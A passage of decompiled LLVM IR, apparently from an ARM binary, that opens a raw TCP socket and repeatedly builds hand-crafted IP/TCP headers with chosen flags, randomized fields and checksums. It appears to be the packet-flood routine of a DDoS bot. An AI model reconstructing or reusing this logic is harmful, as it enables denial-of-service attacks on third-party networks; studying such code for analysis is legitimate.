  %v0_bb9c = load i32, i32* @r5, align 4
  store i32 %v0_bb9c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_bba8 = load i32, i32* @r4, align 4
  store i32 %v0_bba8, i32* %r0.global-to-local, align 4
  %v5_bbac = inttoptr i32 %v0_bb9c to i32*
  %v6_bbac = call i32 @function_8570(i32 %v0_bba8, i32* %v5_bbac, i32 18, i32 65535)
  %v0_bbb0 = load i32, i32* @r5, align 4
  store i32 %v0_bbb0, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bbc0 = load i32, i32* @r4, align 4
  store i32 %v0_bbc0, i32* %r0.global-to-local, align 4
  %v5_bbc4 = inttoptr i32 %v0_bbb0 to i32*
  %v6_bbc4 = call i32 @function_8570(i32 %v0_bbc0, i32* %v5_bbc4, i32 11, i32 0)
  %v0_bbc8 = load i32, i32* @r5, align 4
  store i32 %v0_bbc8, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bbd8 = load i32, i32* @r4, align 4
  store i32 %v0_bbd8, i32* %r0.global-to-local, align 4
  %v5_bbdc = inttoptr i32 %v0_bbc8 to i32*
  %v6_bbdc = call i32 @function_8570(i32 %v0_bbd8, i32* %v5_bbdc, i32 12, i32 1)
  %v0_bbe0 = load i32, i32* @r5, align 4
  store i32 %v0_bbe0, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bbf0 = load i32, i32* @r4, align 4
  store i32 %v0_bbf0, i32* %r0.global-to-local, align 4
  %v5_bbf4 = inttoptr i32 %v0_bbe0 to i32*
  %v6_bbf4 = call i32 @function_8570(i32 %v0_bbf0, i32* %v5_bbf4, i32 13, i32 0)
  %v0_bbf8 = load i32, i32* @r5, align 4
  store i32 %v0_bbf8, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc08 = load i32, i32* @r4, align 4
  store i32 %v0_bc08, i32* %r0.global-to-local, align 4
  %v5_bc0c = inttoptr i32 %v0_bbf8 to i32*
  %v6_bc0c = call i32 @function_8570(i32 %v0_bc08, i32* %v5_bc0c, i32 14, i32 0)
  %v0_bc10 = load i32, i32* @r5, align 4
  store i32 %v0_bc10, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc20 = load i32, i32* @r4, align 4
  store i32 %v0_bc20, i32* %r0.global-to-local, align 4
  %v5_bc24 = inttoptr i32 %v0_bc10 to i32*
  %v6_bc24 = call i32 @function_8570(i32 %v0_bc20, i32* %v5_bc24, i32 15, i32 0)
  %v0_bc28 = load i32, i32* @r5, align 4
  store i32 %v0_bc28, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc38 = load i32, i32* @r4, align 4
  store i32 %v0_bc38, i32* %r0.global-to-local, align 4
  %v5_bc3c = inttoptr i32 %v0_bc28 to i32*
  %v6_bc3c = call i32 @function_8570(i32 %v0_bc38, i32* %v5_bc3c, i32 16, i32 0)
  %v0_bc40 = load i32, i32* @r5, align 4
  store i32 %v0_bc40, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_bc50 = load i32, i32* @r4, align 4
  store i32 %v0_bc50, i32* %r0.global-to-local, align 4
  %v5_bc54 = inttoptr i32 %v0_bc40 to i32*
  %v6_bc54 = call i32 @function_8570(i32 %v0_bc50, i32* %v5_bc54, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bc64 = load i32, i32* @r5, align 4
  store i32 %v0_bc64, i32* %r1.global-to-local, align 4
  %v0_bc68 = load i32, i32* @r4, align 4
  store i32 %v0_bc68, i32* %r0.global-to-local, align 4
  %v4_bc6c = inttoptr i32 %v0_bc64 to i32*
  %v5_bc6c = call i32 @function_8570(i32 %v0_bc68, i32* %v4_bc6c, i32 1, i32 1)
  %v2_bc78 = load i32, i32* @global_var_20780.45, align 4
  store i32 %v2_bc78, i32* %r3.global-to-local, align 4
  %v1_bc7c = urem i32 %v5_bc6c, 256
  store i32 %v1_bc7c, i32* %ip.global-to-local, align 4
  %v0_bc80 = load i32, i32* @r5, align 4
  store i32 %v0_bc80, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_bc88 = load i32, i32* @r4, align 4
  store i32 %v0_bc88, i32* %r0.global-to-local, align 4
  %v5_bc90 = inttoptr i32 %v0_bc80 to i32*
  %v6_bc90 = call i32 @function_8504(i32 %v0_bc88, i32* %v5_bc90, i32 25, i32 %v2_bc78, i32 %v1_bc7c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_bca4 = call i32 @function_113bc(i32 2, i32 3, i32 6)
  store i32 %v3_bca4, i32* %r0.global-to-local, align 4
  %v7_bca8 = icmp eq i32 %v3_bca4, -1
  store i1 %v7_bca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bca8, label %dec_label_pc_c170, label %dec_label_pc_bcb4

dec_label_pc_bcb4:                                ; preds = %dec_label_pc_baa4
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bcbc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bcbc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_bcd0 = call i32 @function_11378(i32 %v3_bca4, i32 0, i32 3, i32 %v6_bcbc, i32 4)
  store i32 %v5_bcd0, i32* %r0.global-to-local, align 4
  %v7_bcd4 = icmp eq i32 %v5_bcd0, -1
  store i1 %v7_bcd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bcd4, label %dec_label_pc_c168, label %dec_label_pc_bcdc

dec_label_pc_bcdc:                                ; preds = %dec_label_pc_bcb4
  %v0_bcdc = load i32, i32* %sb.global-to-local, align 4
  %v3_bcdc = mul i32 %v0_bcdc, 65536
  store i32 %v3_bcdc, i32* @r5, align 4
  %v0_bce0 = load i32, i32* @r6, align 4
  %v0_bce4 = load i32, i32* @sl, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_bcec = urem i32 %v0_bcdc, 65536
  store i32 %v3_bcec, i32* %r1.global-to-local, align 4
  %v3_bcf0 = urem i32 %v0_bce0, 65536
  store i32 %v3_bcf0, i32* %r2.global-to-local, align 4
  %v3_bcf4 = urem i32 %v0_bce4, 65536
  store i32 %v3_bcf4, i32* %r3.global-to-local, align 4
  %v0_bcf8 = load i32, i32* @r7, align 4
  %v2_bcf8 = icmp eq i32 %v0_bcf8, 0
  store i1 %v2_bcf8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bcf8, label %dec_label_pc_c17c, label %dec_label_pc_bd10

dec_label_pc_bd10:                                ; preds = %dec_label_pc_bcdc
  %v3_bd14 = mul i32 %v6_bc54, 65536
  %v1_bd18 = add i32 %v3_bd14, 2621440
  store i32 %v1_bd18, i32* @lr, align 4
  %tmp59 = mul i32 %v0_bce0, 256
  %v3_bd3c = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_bce4, 256
  %v3_bd40 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_bce0, 256
  %v4_bd44 = urem i32 %tmp61, 256
  %v5_bd44 = or i32 %v4_bd44, %v3_bd3c
  store i32 %v5_bd44, i32* @r6, align 4
  %tmp62 = udiv i32 %v0_bce4, 256
  %v4_bd48 = urem i32 %tmp62, 256
  %v5_bd48 = or i32 %v4_bd48, %v3_bd40
  store i32 %v5_bd48, i32* @sl, align 4
  %tmp63 = udiv i32 %v1_bd18, 256
  %v3_bd5c = and i32 %tmp63, 65280
  %tmp64 = mul i32 %v0_bcdc, 256
  %v3_bd60 = and i32 %tmp64, 65280
  %tmp65 = mul i32 %v5_bb90, 256
  %v3_bd64 = and i32 %tmp65, 65280
  %v1_bd68 = urem i32 %v6_bbc4, 2
  %v1_bd6c = urem i32 %v6_bbdc, 2
  %tmp66 = udiv i32 %v5_bb90, 256
  %v4_bd70 = urem i32 %tmp66, 256
  %v5_bd70 = or i32 %v4_bd70, %v3_bd64
  %v4_bd74 = udiv i32 %v1_bd18, 16777216
  %v5_bd74 = or i32 %v3_bd5c, %v4_bd74
  store i32 %v5_bd74, i32* @sb, align 4
  %tmp67 = udiv i32 %v0_bcdc, 256
  %v4_bd78 = urem i32 %tmp67, 256
  %v5_bd78 = or i32 %v4_bd78, %v3_bd60
  store i32 %v5_bd78, i32* @fp, align 4
  %v1_bd94 = urem i32 %v6_bbf4, 2
  store i32 %v1_bd94, i32* %r2.global-to-local, align 4
  %v1_bd98 = urem i32 %v6_bc0c, 2
  store i32 %v1_bd98, i32* %r3.global-to-local, align 4
  %v1_bd9c = urem i32 %v6_bc24, 2
  store i32 %v1_bd9c, i32* %ip.global-to-local, align 4
  %v1_bda0 = urem i32 %v6_bc3c, 2
  store i32 %v1_bda0, i32* %r0.global-to-local, align 4
  %v1_bda4 = urem i32 %v6_bbf4, 256
  store i32 %v1_bda4, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul i32 %v6_bad8, 16777216
  %v4_be18 = sdiv i32 %sext, 16777216
  %sext3 = mul i32 %v5_bb14, 16777216
  %v4_be24 = sdiv i32 %sext3, 16777216
  %tmp = sub nsw i32 0, %v1_bd6c
  %v4_be90 = and i32 %tmp, 16
  %tmp72 = sub nsw i32 0, %v1_bd94
  %v4_beac = and i32 %tmp72, 8
  %tmp73 = sub nsw i32 0, %v1_bd98
  %v4_bec0 = and i32 %tmp73, 4
  %tmp74 = sub nsw i32 0, %v1_bd9c
  %v3_bed4 = and i32 %tmp74, 2
  %v2_bef8 = icmp eq i32 %v1_bda4, 0
  %v1_be20 = trunc i32 %v4_be18 to i8
  %extract.t = trunc i32 %v4_be24 to i8
  br label %dec_label_pc_bdc4

dec_label_pc_bdc4:                                ; preds = %bb70, %dec_label_pc_bd10
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_bdd0 = call i32 @function_11f24(i32 1510, i32 1)
  store i32 %v2_bdd0, i32* %r0.global-to-local, align 4
  %v2_bdd8 = load i32, i32* @r4, align 4
  %v5_bdd8 = mul i32 %v2_bdd8, 4
  %v6_bdd8 = add i32 %v5_bdd8, %v2_bac0
  %v7_bdd8 = inttoptr i32 %v6_bdd8 to i32*
  store i32 %v2_bdd0, i32* %v7_bdd8, align 4
  %v3_bddc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bddc, i32* %r2.global-to-local, align 4
  %v5_bde4 = mul i32 %v3_bddc, 24
  %v1_bde8 = load i32, i32* @r8, align 4
  %v2_bde8 = add i32 %v1_bde8, %v5_bde4
  store i32 %v2_bde8, i32* %r1.global-to-local, align 4
  store i32 %v2_bac0, i32* %r3.global-to-local, align 4
  %v4_bdf0 = mul i32 %v3_bddc, 4
  %v5_bdf0 = add i32 %v4_bdf0, %v2_bac0
  %v6_bdf0 = inttoptr i32 %v5_bdf0 to i32*
  %v7_bdf0 = load i32, i32* %v6_bdf0, align 4
  store i32 %v7_bdf0, i32* @r5, align 4
  %v1_bdf4 = inttoptr i32 %v7_bdf0 to i8*
  %v2_bdf4 = load i8, i8* %v1_bdf4, align 1
  %tmp75 = urem i8 %v2_bdf4, 16
  %v1_bdf8 = zext i8 %tmp75 to i32
  %v1_bdfc = or i32 %v1_bdf8, 64
  store i32 %v1_bdfc, i32* %r3.global-to-local, align 4
  %v1_be00 = trunc i32 %v1_bdfc to i8
  store i8 %v1_be00, i8* %v1_bdf4, align 1
  %v0_be04 = load i32, i32* @r5, align 4
  %v1_be04 = inttoptr i32 %v0_be04 to i8*
  %v2_be04 = load i8, i8* %v1_be04, align 1
  %v1_be08 = and i8 %v2_be04, -16
  %v1_be0c = or i8 %v1_be08, 5
  store i32 %v1_bb40, i32* %ip.global-to-local, align 4
  store i8 %v1_be0c, i8* %v1_be04, align 1
  store i32 %v4_be18, i32* %r0.global-to-local, align 4
  %v0_be1c = load i32, i32* %ip.global-to-local, align 4
  %v2_be1c = icmp eq i32 %v0_be1c, 0
  store i1 %v2_be1c, i1* %cpsr_z.global-to-local, align 1
  %v2_be20 = load i32, i32* @r5, align 4
  %v3_be20 = add i32 %v2_be20, 1
  %v4_be20 = inttoptr i32 %v3_be20 to i8*
  store i8 %v1_be20, i8* %v4_be20, align 1
  store i32 %v4_be24, i32* %r2.global-to-local, align 4
  %v0_be28 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_be28, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_bdc4
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_be2c = load i32, i32* @r5, align 4
  %v4_be2c = add i32 %v3_be2c, 6
  %v5_be2c = inttoptr i32 %v4_be2c to i16*
  store i16 64, i16* %v5_be2c, align 2
  %v0_be34.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t17 = trunc i32 %v0_be34.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bdc4, %bb
  %v0_be34.off0 = phi i8 [ %extract.t, %dec_label_pc_bdc4 ], [ %extract.t17, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_be34 = load i32, i32* @r5, align 4
  %v3_be34 = add i32 %v2_be34, 8
  %v4_be34 = inttoptr i32 %v3_be34 to i8*
  store i8 %v0_be34.off0, i8* %v4_be34, align 1
  %v0_be38 = load i32, i32* %r3.global-to-local, align 4
  %v1_be38 = trunc i32 %v0_be38 to i8
  %v2_be38 = load i32, i32* @r5, align 4
  %v3_be38 = add i32 %v2_be38, 9
  %v4_be38 = inttoptr i32 %v3_be38 to i8*
  store i8 %v1_be38, i8* %v4_be38, align 1
  store i32 %v6_bc90, i32* %ip.global-to-local, align 4
  %v1_be40 = load i32, i32* @r5, align 4
  %v2_be40 = add i32 %v1_be40, 12
  %v3_be40 = inttoptr i32 %v2_be40 to i32*
  store i32 %v6_bc90, i32* %v3_be40, align 4
  %v0_be44 = load i32, i32* %r1.global-to-local, align 4
  %v1_be44 = add i32 %v0_be44, 16
  %v2_be44 = inttoptr i32 %v1_be44 to i32*
  %v3_be44 = load i32, i32* %v2_be44, align 4
  store i32 %v3_be44, i32* %r3.global-to-local, align 4
  %v0_be48 = load i32, i32* @sb, align 4
  %v1_be48 = trunc i32 %v0_be48 to i16
  %v2_be48 = load i32, i32* @r5, align 4
  %v3_be48 = add i32 %v2_be48, 2
  %v4_be48 = inttoptr i32 %v3_be48 to i16*
  store i16 %v1_be48, i16* %v4_be48, align 2
  %v0_be4c = load i32, i32* @fp, align 4
  %v1_be4c = trunc i32 %v0_be4c to i16
  %v2_be4c = load i32, i32* @r5, align 4
  %v3_be4c = add i32 %v2_be4c, 4
  %v4_be4c = inttoptr i32 %v3_be4c to i16*
  store i16 %v1_be4c, i16* %v4_be4c, align 2
  %v0_be50 = load i32, i32* %r3.global-to-local, align 4
  %v1_be50 = load i32, i32* @r5, align 4
  %v2_be50 = add i32 %v1_be50, 16
  %v3_be50 = inttoptr i32 %v2_be50 to i32*
  store i32 %v0_be50, i32* %v3_be50, align 4
  %v0_be54 = load i32, i32* @r6, align 4
  %v1_be54 = trunc i32 %v0_be54 to i16
  %v2_be54 = load i32, i32* @r5, align 4
  %v3_be54 = add i32 %v2_be54, 20
  %v4_be54 = inttoptr i32 %v3_be54 to i16*
  store i16 %v1_be54, i16* %v4_be54, align 2
  %v0_be58 = load i32, i32* @r5, align 4
  %v1_be58 = add i32 %v0_be58, 20
  store i32 %v1_be58, i32* @r4, align 4
  %v1_be5c = add i32 %v0_be58, 32
  %v2_be5c = inttoptr i32 %v1_be5c to i8*
  %v3_be5c = load i8, i8* %v2_be5c, align 1
  %v4_be5c = zext i8 %v3_be5c to i32
  store i32 %v4_be5c, i32* %r3.global-to-local, align 4
  %v1_be60 = add i32 %v0_be58, 33
  %v2_be60 = inttoptr i32 %v1_be60 to i8*
  %v3_be60 = load i8, i8* %v2_be60, align 1
  %v4_be60 = zext i8 %v3_be60 to i32
  store i32 %v1_bd68, i32* %r0.global-to-local, align 4
  %tmp76 = urem i8 %v3_be5c, 16
  %v1_be68 = zext i8 %tmp76 to i32
  %v1_be6c = or i32 %v1_be68, 80
  store i32 %v1_be6c, i32* %r3.global-to-local, align 4
  %v1_be70 = and i32 %v4_be60, 223
  store i32 %v1_be70, i32* %r2.global-to-local, align 4
  %v1_be74 = trunc i32 %v1_be6c to i8
  store i8 %v1_be74, i8* %v2_be5c, align 1
  %v0_be78 = load i32, i32* %r2.global-to-local, align 4
  %v1_be78 = load i32, i32* %r0.global-to-local, align 4
  %v4_be78 = mul i32 %v1_be78, 32
  %v5_be78 = or i32 %v4_be78, %v0_be78
  store i32 %v5_be78, i32* %r2.global-to-local, align 4
  store i32 %v5_bd70, i32* %r1.global-to-local, align 4
  %v1_be80 = trunc i32 %v5_be78 to i8
  %v2_be80 = load i32, i32* @r4, align 4
  %v3_be80 = add i32 %v2_be80, 13
  %v4_be80 = inttoptr i32 %v3_be80 to i8*
  store i8 %v1_be80, i8* %v4_be80, align 1
  %v0_be84 = load i32, i32* @r4, align 4
  %v1_be84 = add i32 %v0_be84, 13
  %v2_be84 = inttoptr i32 %v1_be84 to i8*
  %v3_be84 = load i8, i8* %v2_be84, align 1
  %v4_be84 = zext i8 %v3_be84 to i32
  store i32 %v1_bd6c, i32* %r2.global-to-local, align 4
  %v1_be8c = and i32 %v4_be84, 239
  %v5_be90 = or i32 %v1_be8c, %v4_be90
  store i32 %v5_be90, i32* %r3.global-to-local, align 4
  %v0_be94 = load i32, i32* %r1.global-to-local, align 4
  %v2_be94 = add i32 %v0_be84, 4
  %v3_be94 = inttoptr i32 %v2_be94 to i32*
  store i32 %v0_be94, i32* %v3_be94, align 4
  %v0_be98 = load i32, i32* @sl, align 4
  %v1_be98 = trunc i32 %v0_be98 to i16
  %v2_be98 = load i32, i32* @r4, align 4
  %v3_be98 = add i32 %v2_be98, 2
  %v4_be98 = inttoptr i32 %v3_be98 to i16*
  store i16 %v1_be98, i16* %v4_be98, align 2
  %v0_be9c = load i32, i32* %r3.global-to-local, align 4
  %v1_be9c = trunc i32 %v0_be9c to i8
  %v2_be9c = load i32, i32* @r4, align 4
  %v3_be9c = add i32 %v2_be9c, 13
  %v4_be9c = inttoptr i32 %v3_be9c to i8*
  store i8 %v1_be9c, i8* %v4_be9c, align 1
  %v0_bea0 = load i32, i32* @r4, align 4
  %v1_bea0 = add i32 %v0_bea0, 13
  %v2_bea0 = inttoptr i32 %v1_bea0 to i8*
  %v3_bea0 = load i8, i8* %v2_bea0, align 1
  %v4_bea0 = zext i8 %v3_bea0 to i32
  store i32 %v1_bd94, i32* %r3.global-to-local, align 4
  %v1_bea8 = and i32 %v4_bea0, 247
  %v5_beac = or i32 %v1_bea8, %v4_beac
  store i32 %v5_beac, i32* %r2.global-to-local, align 4
  %v1_beb0 = trunc i32 %v5_beac to i8
  store i8 %v1_beb0, i8* %v2_bea0, align 1
  %v0_beb4 = load i32, i32* @r4, align 4
  %v1_beb4 = add i32 %v0_beb4, 13
  %v2_beb4 = inttoptr i32 %v1_beb4 to i8*
  %v3_beb4 = load i8, i8* %v2_beb4, align 1
  %v4_beb4 = zext i8 %v3_beb4 to i32
  store i32 %v1_bd98, i32* %ip.global-to-local, align 4
  %v1_bebc = and i32 %v4_beb4, 251
  %v5_bec0 = or i32 %v1_bebc, %v4_bec0
  store i32 %v5_bec0, i32* %r3.global-to-local, align 4
  %v1_bec4 = trunc i32 %v5_bec0 to i8
  store i8 %v1_bec4, i8* %v2_beb4, align 1
  %v0_bec8 = load i32, i32* @r4, align 4
  %v1_bec8 = add i32 %v0_bec8, 13
  %v2_bec8 = inttoptr i32 %v1_bec8 to i8*
  %v3_bec8 = load i8, i8* %v2_bec8, align 1
  %v4_bec8 = zext i8 %v3_bec8 to i32
  store i32 %v1_bd9c, i32* %r0.global-to-local, align 4
  %v1_bed0 = and i32 %v4_bec8, 253
  %v4_bed4 = or i32 %v1_bed0, %v3_bed4
  store i32 %v4_bed4, i32* %r2.global-to-local, align 4
  %v1_bed8 = trunc i32 %v4_bed4 to i8
  store i8 %v1_bed8, i8* %v2_bec8, align 1
  %v0_bedc = load i32, i32* @r4, align 4
  %v1_bedc = add i32 %v0_bedc, 13
  %v2_bedc = inttoptr i32 %v1_bedc to i8*
  %v3_bedc = load i8, i8* %v2_bedc, align 1
  %v4_bedc = zext i8 %v3_bedc to i32
  store i32 %v1_bda0, i32* %r1.global-to-local, align 4
  %v1_bee4 = and i32 %v4_bedc, 254
  %v2_bee8 = or i32 %v1_bee4, %v1_bda0
  store i32 %v2_bee8, i32* %r3.global-to-local, align 4
  %v1_beec = trunc i32 %v2_bee8 to i8
  store i8 %v1_beec, i8* %v2_bedc, align 1
  %v0_bef0 = call i32 @function_e094()
  %v1_bef0 = trunc i32 %v0_bef0 to i16
  store i32 %v0_bef0, i32* %r0.global-to-local, align 4
  store i32 %v1_bda4, i32* %r2.global-to-local, align 4
  store i1 %v2_bef8, i1* %cpsr_z.global-to-local, align 1
  %v3_bf04.pre = load i32, i32* @r4, align 4
  br i1 %v2_bef8, label %.thread4, label %bb68

bb68:                                             ; preds = %.thread
  %v2_befc = add i32 %v3_bf04.pre, 13
  %v3_befc = inttoptr i32 %v2_befc to i8*
  %v4_befc = load i8, i8* %v3_befc, align 1
  %v5_befc = zext i8 %v4_befc to i32
  %v2_bf00 = or i32 %v5_befc, 8
  store i32 %v2_bf00, i32* @r3, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread, %bb68
  %v4_bf04 = add i32 %v3_bf04.pre, 14
  %v5_bf04 = inttoptr i32 %v4_bf04 to i16*
  store i16 %v1_bef0, i16* %v5_bf04, align 2
  store i32 %v6_bc54, i32* %r1.global-to-local, align 4
  %v0_bf0c = load i32, i32* @r5, align 4
  %v1_bf0c = add i32 %v0_bf0c, 40
  store i32 %v1_bf0c, i32* %r0.global-to-local, align 4
  br i1 %v2_bef8, label %bb70, label %bb69

bb69:                                             ; preds = %.thread4
  %v1_bf10 = load i32, i32* @r3, align 4
  %v2_bf10 = trunc i32 %v1_bf10 to i8
  %v3_bf10 = load i32, i32* @r4, align 4
  %v4_bf10 = add i32 %v3_bf10, 13
  %v5_bf10 = inttoptr i32 %v4_bf10 to i8*
  store i8 %v2_bf10, i8* %v5_bf10, align 1
  br label %bb70

bb70:                                             ; preds = %.thread4, %bb69
  %v2_bf14 = inttoptr i32 %v1_bf0c to i16*
  %v3_bf14 = call i32 @function_e228(i16* %v2_bf14, i32 %v6_bc54)
  store i32 %v3_bf14, i32* %r0.global-to-local, align 4
  %v3_bf18 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bf18, i32* %r3.global-to-local, align 4
  %v1_bf1c = add i32 %v3_bf18, 1
  store i32 %v1_bf1c, i32* @r4, align 4
  %v1_bf20 = load i32, i32* @r7, align 4
  %v9_bf20 = icmp eq i32 %v1_bf1c, %v1_bf20
  store i1 %v9_bf20, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bf1c, i32* %stack_var_-44, align 4
  %v5_bf28 = icmp slt i32 %v1_bf1c, %v1_bf20
  br i1 %v5_bf28, label %dec_label_pc_bdc4, label %dec_label_pc_bf2c

dec_label_pc_bf2c:                                ; preds = %bb70
  store i32 %v6_bc54, i32* %r3.global-to-local, align 4
  %v1_bf30 = add i32 %v6_bc54, 20
  store i32 %v1_bf30, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_bf38

dec_label_pc_bf38:                                ; preds = %dec_label_pc_c17c, %dec_label_pc_bf2c
  %v0_bf508 = phi i32 [ %v1_bf20, %dec_label_pc_bf2c ], [ 0, %dec_label_pc_c17c ]
  %stack_var_-140.0 = phi i32 [ %v3_bd14, %dec_label_pc_bf2c ], [ %v3_c188, %dec_label_pc_c17c ]
  %storemerge = add i32 %v6_bc54, 40
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 %stack_var_-140.0, i32* %r1.global-to-local, align 4
  %v1_bf3c = add i32 %stack_var_-140.0, 1310720
  store i32 %v1_bf3c, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v1_bf3c, 256
  %v3_bf44 = and i32 %tmp71, 65280
  store i32 %v3_bf44, i32* %r3.global-to-local, align 4
  %v4_bf48 = udiv i32 %v1_bf3c, 16777216
  %v5_bf48 = or i32 %v3_bf44, %v4_bf48
  store i32 %v5_bf48, i32* @sl, align 4
  %v3_c0e8 = icmp eq i32 %v3_bcec, 65535
  %v2_c14c = icmp eq i32 %v1_bc7c, 0
  %v2_bf88 = icmp eq i32 %v6_bc90, -1
  %v7_bf88 = icmp eq i32 %v6_bc90, -1
  br label %dec_label_pc_bf4c

dec_label_pc_bf4c:                                ; preds = %dec_label_pc_bf4c, %dec_label_pc_c064, %dec_label_pc_bf38
  %v0_bf50 = phi i32 [ %v0_bf508, %dec_label_pc_bf38 ], [ 0, %dec_label_pc_c064 ], [ 0, %dec_label_pc_bf4c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bf50 = icmp eq i32 %v0_bf50, 0
  store i1 %v2_bf50, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bf50, label %dec_label_pc_bf4c, label %dec_label_pc_bf5c

dec_label_pc_bf5c:                                ; preds = %dec_label_pc_bf4c, %dec_label_pc_c064
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bf60

dec_label_pc_bf60:                                ; preds = %dec_label_pc_bfe0, %dec_label_pc_bf5c
  %v1_bf74 = phi i32 [ %v1_c054, %dec_label_pc_bfe0 ], [ 0, %dec_label_pc_bf5c ]
  %v5_bf64 = mul i32 %v1_bf74, 24
  %v1_bf68 = load i32, i32* @r8, align 4
  %v2_bf68 = add i32 %v1_bf68, %v5_bf64
  store i32 %v2_bf68, i32* %r3.global-to-local, align 4
  store i32 %v2_bac0, i32* %ip.global-to-local, align 4
  %v1_bf70 = add i32 %v2_bf68, 20
  %v2_bf70 = inttoptr i32 %v1_bf70 to i8*
  %v3_bf70 = load i8, i8* %v2_bf70, align 1
  %v4_bf70 = zext i8 %v3_bf70 to i32
  store i32 %v4_bf70, i32* %r2.global-to-local, align 4
  %v4_bf74 = mul i32 %v1_bf74, 4
  %v5_bf74 = add i32 %v4_bf74, %v2_bac0
  %v6_bf74 = inttoptr i32 %v5_bf74 to i32*
  %v7_bf74 = load i32, i32* %v6_bf74, align 4
  store i32 %v7_bf74, i32* @r5, align 4
  %v7_bf78 = icmp eq i8 %v3_bf70, 31
  store i1 %v7_bf78, i1* %cpsr_z.global-to-local, align 1
  %v1_bf7c = add i32 %v7_bf74, 20
  store i32 %v1_bf7c, i32* @r6, align 4
  %tmp77 = icmp ult i8 %v3_bf70, 32
  br i1 %tmp77, label %dec_label_pc_c078, label %dec_label_pc_bf84

dec_label_pc_bf84:                                ; preds = %dec_label_pc_bf60
  store i32 %v6_bc90, i32* %r0.global-to-local, align 4
  store i1 %v7_bf88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bf88, label %dec_label_pc_c0d8, label %dec_label_pc_bf90

dec_label_pc_bf90:                                ; preds = %dec_label_pc_c078, %dec_label_pc_bf84
  store i32 %v3_bcec, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c0e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c0e8, label %dec_label_pc_c0f4, label %dec_label_pc_bfa4

dec_label_pc_bfa4:                                ; preds = %dec_label_pc_c0d8.dec_label_pc_bfa4_crit_edge, %dec_label_pc_bf90
  %v1_bfa8 = phi i32 [ %v1_bfa8.pre, %dec_label_pc_c0d8.dec_label_pc_bfa4_crit_edge ], [ 65535, %dec_label_pc_bf90 ]
  store i32 %v3_bcf0, i32* %r2.global-to-local, align 4
  %v9_bfa8 = icmp eq i32 %v3_bcf0, %v1_bfa8
  store i1 %v9_bfa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bfa8, label %dec_label_pc_c108, label %dec_label_pc_bfb0

dec_label_pc_bfb0:                                ; preds = %dec_label_pc_c0f4.dec_label_pc_bfb0_crit_edge, %dec_label_pc_bfa4
  %v1_bfb4 = phi i32 [ %v1_bfb4.pre, %dec_label_pc_c0f4.dec_label_pc_bfb0_crit_edge ], [ %v1_bfa8, %dec_label_pc_bfa4 ]
  store i32 %v3_bcf4, i32* %r3.global-to-local, align 4
  %v9_bfb4 = icmp eq i32 %v3_bcf4, %v1_bfb4
  store i1 %v9_bfb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bfb4, label %dec_label_pc_c11c, label %dec_label_pc_bfbc

dec_label_pc_bfbc:                                ; preds = %dec_label_pc_c108.dec_label_pc_bfbc_crit_edge, %dec_label_pc_bfb0
  %v1_bfc0 = phi i32 [ %v1_bfc0.pre, %dec_label_pc_c108.dec_label_pc_bfbc_crit_edge ], [ %v1_bfb4, %dec_label_pc_bfb0 ]
